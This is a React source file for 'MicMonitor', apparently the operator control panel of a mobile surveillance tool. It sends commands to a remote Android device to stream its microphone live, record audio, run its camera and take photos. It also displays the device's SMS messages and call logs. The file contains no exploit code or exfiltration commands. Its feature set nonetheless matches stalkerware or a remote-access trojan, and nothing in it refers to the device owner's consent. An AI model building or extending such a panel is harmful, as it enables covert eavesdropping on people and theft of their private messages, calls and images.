import { useState, useCallback, useEffect } from 'react'
import { ControlButtons } from './components/dashboard/ControlButtons'
import { DeviceInfoPanel } from './components/dashboard/DeviceInfoPanel'
import { NetworkProfile } from './components/dashboard/NetworkProfile'
import { SMSPanel } from './components/dashboard/SMSPanel'
import { CallsPanel } from './components/dashboard/CallsPanel'
import { RecordingsPanel } from './components/dashboard/RecordingsPanel'
import { EventLog } from './components/dashboard/EventLog'
import { CameraLiveFeed } from './components/dashboard/CameraLiveFeed'
import { useDashboard } from './hooks/useDashboard'
import { useAudioPlayback } from './hooks/useAudioPlayback'
import { useWebRTC } from './hooks/useWebRTC'
import type { CameraFrame } from './types/dashboard'

function App() {
  const audioPlayback = useAudioPlayback()
  const webRTC = useWebRTC()
  const [cameraFrame, setCameraFrame] = useState<CameraFrame | null>(null)
  const [isCameraLive, setIsCameraLive] = useState(false)
  const [isRecording, setIsRecording] = useState(false)
  const [now, setNow] = useState(new Date())

  // Live clock
  useEffect(() => {
    const t = setInterval(() => setNow(new Date()), 1000)
    return () => clearInterval(t)
  }, [])

  const formatTime = (d: Date) =>
    d.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })
  const formatDate = (d: Date) =>
    d.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric', year: 'numeric' })

  const handleAudioData = useCallback((data: ArrayBuffer, deviceId: string) => {
    audioPlayback.feedAudio(data, deviceId)
  }, [audioPlayback])

  const handleWebRTCMessage = useCallback((msg: Record<string, unknown>) => {
    webRTC.handleMessage(msg)
  }, [webRTC])

  const handleCameraFrame = useCallback((frame: CameraFrame) => {
    setCameraFrame(frame)
    setIsCameraLive(true)
  }, [])

  const {
    wsState,
    devices,
    selectedDevice,
    selectedDeviceId,
    feed,
    photos,
    recordings,
    setSelectedDeviceId,
    sendCommand,
  } = useDashboard(handleAudioData, handleWebRTCMessage, handleCameraFrame)

  const [isListening, setIsListening] = useState(false)

  const handleCommand = useCallback((cmd: string, extra?: Record<string, unknown>) => {
    if (cmd === 'start_stream') {
      audioPlayback.start()
      setIsListening(true)
    } else if (cmd === 'stop_stream') {
      audioPlayback.stop()
      setIsListening(false)
    } else if (cmd === 'webrtc_start') {
      webRTC.start(sendCommand)
      return
    } else if (cmd === 'webrtc_stop') {
      webRTC.stop(sendCommand)
      return
    } else if (cmd === 'camera_live_start') {
      setIsCameraLive(true)
    } else if (cmd === 'camera_live_stop') {
      setIsCameraLive(false)
      setCameraFrame(null)
    } else if (cmd === 'start_record') {
      setIsRecording(true)
    } else if (cmd === 'stop_record') {
      setIsRecording(false)
    }
    sendCommand(cmd, extra)
  }, [audioPlayback, webRTC, sendCommand])

  useEffect(() => {
    if (isListening && !audioPlayback.state.isPlaying) {
      audioPlayback.start()
    }
  }, [isListening, audioPlayback])

  useEffect(() => {
    if (!isCameraLive) {
      const timeout = setTimeout(() => setCameraFrame(null), 3000)
      return () => clearTimeout(timeout)
    }
  }, [isCameraLive])

  const isWebRtcActive = webRTC.stats.state === 'connected' || webRTC.stats.state === 'connecting'
  const isConnected = wsState === 'open'
  const isStreaming = isListening || audioPlayback.state.isPlaying
  const health = selectedDevice?.health

  return (
    <div className="min-h-screen text-slate-200" style={{ background: 'linear-gradient(135deg, #06080f 0%, #0a0e1a 40%, #0d1220 100%)' }}>
      
      {/* ─── TOP HEADER BAR ─────────────────────────────────────────────────── */}
      <header style={{
        background: 'rgba(10,14,26,0.85)',
        backdropFilter: 'blur(20px)',
        borderBottom: '1px solid rgba(99,102,241,0.15)',
        boxShadow: '0 1px 40px rgba(99,102,241,0.08)'
      }} className="sticky top-0 z-50 px-5 py-3">
        <div className="flex items-center justify-between max-w-screen-2xl mx-auto">
          {/* Brand */}
          <div className="flex items-center gap-4">
            <div className="relative">
              <div className="w-10 h-10 rounded-xl flex items-center justify-center font-black text-lg text-white"
                style={{ background: 'linear-gradient(135deg, #6366f1, #8b5cf6)', boxShadow: '0 4px 20px rgba(99,102,241,0.4)' }}>
                M
              </div>
              {isStreaming && (
                <span className="absolute -top-1 -right-1 w-3 h-3 rounded-full bg-emerald-400 animate-pulse border-2 border-[#0a0e1a]" />
              )}
            </div>
            <div>
              <h1 className="text-base font-bold tracking-wide text-white">MicMonitor</h1>
              <p className="text-[10px] text-indigo-400 uppercase tracking-widest font-medium">Remote Audio Intelligence</p>
            </div>
          </div>

          {/* Center — stats bar */}
          <div className="hidden md:flex items-center gap-6">
            <StatPill icon="📱" label="Devices" value={devices.length.toString()} color={devices.length > 0 ? '#10b981' : '#64748b'} />
            <StatPill icon="🎙" label="Audio" value={isStreaming ? 'LIVE' : 'IDLE'} color={isStreaming ? '#10b981' : '#64748b'} pulse={isStreaming} />
            <StatPill icon="📶" label="Network" value={health?.lowNetwork ? 'LOW-BW' : 'HQ'} color={health?.lowNetwork ? '#f59e0b' : '#6366f1'} />
            <StatPill icon="🔋" label="Battery" value={health?.batteryPct !== undefined && health.batteryPct !== null ? `${health.batteryPct}%` : '—'} color={health?.batteryPct !== null && health?.batteryPct !== undefined && health.batteryPct < 20 ? '#ef4444' : '#64748b'} />
          </div>

          {/* Right — connection + clock */}
          <div className="flex items-center gap-4">
            <div className="text-right hidden sm:block">
              <div className="text-sm font-mono font-semibold text-white tracking-widest">{formatTime(now)}</div>
              <div className="text-[10px] text-slate-500">{formatDate(now)}</div>
            </div>
            <WsStatusBadge state={wsState} />
          </div>
        </div>
      </header>

      {/* ─── HERO LIVE BAR (when streaming) ─────────────────────────────────── */}
      {isStreaming && (
        <div style={{
          background: 'linear-gradient(90deg, rgba(16,185,129,0.05) 0%, rgba(99,102,241,0.08) 50%, rgba(139,92,246,0.05) 100%)',
          borderBottom: '1px solid rgba(16,185,129,0.15)'
        }} className="px-5 py-2">
          <div className="max-w-screen-2xl mx-auto flex items-center gap-3">
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <span className="text-xs font-semibold text-emerald-400 uppercase tracking-wider">Live Audio Stream Active</span>
            </div>
            <div className="flex-1 h-0.5 rounded" style={{ background: 'linear-gradient(90deg, #10b981, #6366f1, #8b5cf6, transparent)' }} />
            <LiveBeatBars />
          </div>
        </div>
      )}

      {/* ─── MAIN CONTENT ────────────────────────────────────────────────────── */}
      <main className="p-4 md:p-5 max-w-screen-2xl mx-auto space-y-5">

        {/* Device tabs (if multiple) */}
        {devices.length > 1 && (
          <div className="flex gap-2 flex-wrap">
            {devices.map((device) => (
              <button
                key={device.deviceId}
                onClick={() => setSelectedDeviceId(device.deviceId)}
                className="px-4 py-2 text-sm rounded-xl font-medium transition-all duration-200"
                style={{
                  background: selectedDeviceId === device.deviceId
                    ? 'linear-gradient(135deg, rgba(99,102,241,0.3), rgba(139,92,246,0.3))'
                    : 'rgba(15,20,40,0.6)',
                  border: `1px solid ${selectedDeviceId === device.deviceId ? 'rgba(99,102,241,0.5)' : 'rgba(255,255,255,0.07)'}`,
                  color: selectedDeviceId === device.deviceId ? '#a5b4fc' : '#64748b',
                  boxShadow: selectedDeviceId === device.deviceId ? '0 0 20px rgba(99,102,241,0.2)' : 'none'
                }}
              >
                📱 {device.model || device.deviceId.substring(0, 8)}
              </button>
            ))}
          </div>
        )}

        {/* No device placeholder */}
        {devices.length === 0 && (
          <GlassCard className="py-16 text-center">
            <div className="text-6xl mb-4 opacity-30">📡</div>
            <div className="text-lg font-semibold text-slate-300 mb-2">Waiting for device…</div>
            <div className="text-sm text-slate-500">Make sure the Android app is running and connected to the internet.</div>
            <div className="mt-4 flex items-center justify-center gap-2">
              <span className={`w-2 h-2 rounded-full ${isConnected ? 'bg-emerald-400' : 'bg-red-400 animate-pulse'}`} />
              <span className="text-xs text-slate-500">{isConnected ? 'Server connected — listening for devices' : 'Connecting to server…'}</span>
            </div>
          </GlassCard>
        )}

        {/* ── Top row: Network Profile + Device Info ────────────────────────── */}
        {selectedDevice && (
          <>
            {/* Network profile — wide full-width strip */}
            <NetworkProfile
              lowNetwork={health?.lowNetwork}
              streamCodec={health?.streamCodec}
              streamCodecMode={health?.streamCodecMode}
              onForceToggle={() => handleCommand('set_low_network', { enabled: !health?.lowNetwork })}
              isStreaming={isStreaming}
              connQuality={health?.connQuality}
              netType={health?.netType}
            />

            {/* Device info panel + Controls side-by-side on wide screens */}
            <div className="grid grid-cols-1 xl:grid-cols-5 gap-5">
              {/* Device Info — 3/5 */}
              <div className="xl:col-span-3">
                <DeviceInfoPanel
                  device={selectedDevice}
                  audioState={audioPlayback.state}
                  webRTCState={webRTC.stats}
                />
              </div>
              {/* Controls — 2/5 */}
              <div className="xl:col-span-2">
                <GlassCard>
                  <SectionLabel>Controls</SectionLabel>
                  <ControlButtons
                    onCommand={handleCommand}
                    health={selectedDevice?.health}
                    isStreaming={isStreaming}
                    isRecording={isRecording}
                    isWebRtcActive={isWebRtcActive}
                    isCameraLive={isCameraLive}
                  />
                </GlassCard>
              </div>
            </div>

            {/* ── Media row: Camera + SMS + Calls ────────────────────────────── */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
              <CameraLiveFeed
                frame={cameraFrame}
                photos={photos}
                onTakePhoto={() => handleCommand('take_photo')}
                onSwitchCamera={() => handleCommand('switch_camera')}
                onStopLive={() => handleCommand('camera_live_stop')}
              />
              <SMSPanel messages={selectedDevice?.sms || []} />
              <CallsPanel calls={selectedDevice?.calls || []} />
            </div>

            {/* ── Bottom row: Recordings + Event Log ─────────────────────────── */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
              <RecordingsPanel recordings={recordings} />
              <EventLog events={feed} />
            </div>
          </>
        )}
      </main>
    </div>
  )
}

// ── Shared sub-components ──────────────────────────────────────────────────────

function GlassCard({ children, className = '' }: { children: React.ReactNode; className?: string }) {
  return (
    <div className={`rounded-2xl p-4 ${className}`} style={{
      background: 'rgba(15,20,40,0.6)',
      border: '1px solid rgba(255,255,255,0.07)',
      backdropFilter: 'blur(12px)',
      boxShadow: '0 4px 32px rgba(0,0,0,0.3)'
    }}>
      {children}
    </div>
  )
}

function SectionLabel({ children }: { children: React.ReactNode }) {
  return (
    <div className="text-[10px] uppercase tracking-widest font-bold text-indigo-400 mb-3 flex items-center gap-2">
      <span className="flex-1 h-px" style={{ background: 'linear-gradient(90deg, rgba(99,102,241,0.4), transparent)' }} />
      {children}
      <span className="flex-1 h-px" style={{ background: 'linear-gradient(90deg, transparent, rgba(99,102,241,0.4))' }} />
    </div>
  )
}

function StatPill({ icon, label, value, color, pulse = false }: {
  icon: string; label: string; value: string; color: string; pulse?: boolean
}) {
  return (
    <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg" style={{
      background: 'rgba(255,255,255,0.04)',
      border: '1px solid rgba(255,255,255,0.06)'
    }}>
      <span className="text-sm">{icon}</span>
      <div>
        <div className="text-[9px] uppercase tracking-widest text-slate-500">{label}</div>
        <div className="text-xs font-bold flex items-center gap-1" style={{ color }}>
          {pulse && <span className="w-1.5 h-1.5 rounded-full bg-current animate-pulse" />}
          {value}
        </div>
      </div>
    </div>
  )
}

function WsStatusBadge({ state }: { state: string }) {
  const config = {
    open: { color: '#10b981', bg: 'rgba(16,185,129,0.12)', border: 'rgba(16,185,129,0.3)', label: 'Connected', dot: false },
    connecting: { color: '#f59e0b', bg: 'rgba(245,158,11,0.12)', border: 'rgba(245,158,11,0.3)', label: 'Connecting…', dot: true },
    closed: { color: '#ef4444', bg: 'rgba(239,68,68,0.12)', border: 'rgba(239,68,68,0.3)', label: 'Disconnected', dot: true },
  }[state] || { color: '#64748b', bg: 'rgba(100,116,139,0.12)', border: 'rgba(100,116,139,0.3)', label: state, dot: false }

  return (
    <div className="flex items-center gap-2 px-3 py-2 rounded-xl text-xs font-semibold" style={{
      background: config.bg, border: `1px solid ${config.border}`, color: config.color
    }}>
      <span className={`w-2 h-2 rounded-full bg-current ${config.dot ? 'animate-pulse' : ''}`} />
      {config.label}
    </div>
  )
}

function LiveBeatBars() {
  return (
    <div className="flex items-end gap-0.5 h-5">
      {Array.from({ length: 12 }).map((_, i) => (
        <div
          key={i}
          className="w-1 rounded-sm"
          style={{
            height: `${20 + Math.random() * 80}%`,
            background: `hsl(${145 + i * 4}, 70%, 55%)`,
            animation: `beatBar ${0.4 + Math.random() * 0.6}s ease-in-out infinite alternate`,
            animationDelay: `${i * 0.07}s`
          }}
        />
      ))}
      <style>{`
        @keyframes beatBar {
          from { transform: scaleY(0.3); opacity: 0.6; }
          to { transform: scaleY(1); opacity: 1; }
        }
      `}</style>
    </div>
  )
}

export default App
